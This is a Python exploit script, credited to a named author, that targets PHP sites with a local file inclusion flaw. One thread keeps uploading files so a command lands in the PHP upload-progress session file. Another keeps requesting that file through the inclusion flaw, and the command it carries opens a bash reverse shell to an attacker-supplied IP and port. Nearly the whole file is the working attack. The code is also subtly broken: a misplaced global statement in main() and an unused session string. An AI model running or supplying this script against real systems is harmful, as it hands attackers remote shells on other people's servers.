#!/usr/bin/env python3
# made by Taylor Christian Newsome

import argparse
import threading
import time
import requests

STOP_FLAG = False

def generate_session_data(session_key, attacker_ip, attacker_port):
    """Generates the bash command and calculates its exact serialization length."""
    cmd = f"nohup bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1' >/dev/null 2>&1 &"
    cmd_length = len(cmd)
    
    # Construct the serialized session string structure matching PHP rfc1867 formatting
    session_data = (
        f"upload_progress_{session_key}|a:5:"
        f'{{s:10:"start_time";i:1700000000;'
        f's:14:"content_length";i:1000;'
        f's:15:"bytes_processed";i:1000;'
        f's:4:"done";b:0;'
        f's:5:"files";a:1:{{i:0;a:7:{{'
        f's:10:"field_name";s:4:"file";'
        f's:4:"name";s:{cmd_length}:"{cmd}";'
        f's:8:"tmp_name";s:0:"";'
        f's:5:"error";i:0;'
        f's:4:"done";b:1;'
        f's:9:"start_time";i:1700000000;'
        f's:15:"bytes_processed";i:1000;'
        f'}}}}}}'
    )
    return cmd, session_data

def uploader(upload_url, session_id, cmd):
    """Continuously fires upload requests to write/maintain the session file."""
    global STOP_FLAG
    files = {'file': (cmd, 'A' * 10000)}
    data = {'PHP_SESSION_UPLOAD_PROGRESS': session_id}
    cookies = {'PHPSESSID': session_id}
    
    while not STOP_FLAG:
        try:
            requests.post(upload_url, files=files, data=data, cookies=cookies, timeout=1)
        except requests.exceptions.RequestException:
            pass

def includer(lfi_url, session_id):
    """Continuously queries the LFI target to include the temporary session file before cleanup."""
    global STOP_FLAG
    session_paths = [
        f"/var/lib/php/sessions/sess_{session_id}",
        f"/tmp/sess_{session_id}"
    ]
    
    while not STOP_FLAG:
        for path in session_paths:
            try:
                target = f"{lfi_url}{path}"
                resp = requests.get(target, timeout=1)
                if resp.status_code == 200 and ("nohup" in resp.text or "bash" in resp.text):
                    print(f"\n[+] Successfully triggered session inclusion via: {path}")
                    STOP_FLAG = True
                    return
            except requests.exceptions.RequestException:
                pass

def main():
    parser = argparse.ArgumentParser(
        description="All-in-One Session Upload Progress LFI Exploit Tool\nmade by Taylor Christian Newsome",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-u", "--upload-url", required=True, help="Target URL handling the file upload")
    parser.add_argument("-l", "--lfi-url", required=True, help="Target LFI URL base (e.g., http://target/index.php?page=)")
    parser.add_argument("-i", "--ip", required=True, help="Attacker IP address for the reverse shell")
    parser.add_argument("-p", "--port", default="4444", help="Attacker port for the reverse shell (default: 4444)")
    parser.add_argument("-s", "--session", default="testkey", help="Session ID / progress key (default: testkey)")

    args = parser.parse_args()

    print("==========================================")
    print(" Session Upload Progress Exploit Tool     ")
    print(" made by Taylor Christian Newsome         ")
    print("==========================================")

    cmd, session_data = generate_session_data(args.session, args.ip, args.port)
    print(f"[*] Target Upload URL: {args.upload_url}")
    print(f"[*] Target LFI Base:   {args.lfi_url}")
    print(f"[*] Reverse Shell IP:  {args.ip}:{args.port}")
    print(f"[*] Command Length:    {len(cmd)} bytes")
    print("[*] Starting concurrent uploader and includer threads...")

    t_upload = threading.Thread(target=uploader, args=(args.upload_url, args.session, cmd))
    t_include = threading.Thread(target=includer, args=(args.lfi_url, args.session))

    t_upload.daemon = True
    t_include.daemon = True

    t_upload.start()
    t_include.start()

    try:
        while not STOP_FLAG:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[*] Stopping exploit execution...")
        global STOP_FLAG
        STOP_FLAG = True

if __name__ == "__main__":
    main()
